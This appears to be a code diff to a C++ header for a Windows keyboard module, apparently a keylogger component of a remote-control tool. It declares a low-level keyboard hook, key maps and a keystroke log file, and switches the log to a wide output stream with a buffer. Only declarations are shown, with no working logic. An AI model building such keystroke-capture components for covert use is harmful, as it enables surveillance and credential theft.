@@ -2,9 +2,11 @@
 #define KEYBOARD_H
 
 #include <Windows.h>
+#include <codecvt>
 #include <ctime>
 #include <fstream>
 #include <iostream>
+#include <locale>
 #include <map>
 #include <mutex>
 #include <sstream>
@@ -26,8 +28,9 @@ extern std::map<int, std::wstring> mapSpecialKeys;
 extern HANDLE breachEvent;
 extern HHOOK ghHook;
 extern KBDLLHOOKSTRUCT kbdStruct;
-extern std::wfstream logFile;
+extern std::wofstream logFile;
 extern std::mutex logFileMutex;
+extern std::wstring logFileBuffer;
 extern std::map<std::wstring, bool> modKeyStates;
 
 class KeyboardMod : public RCDOMod {
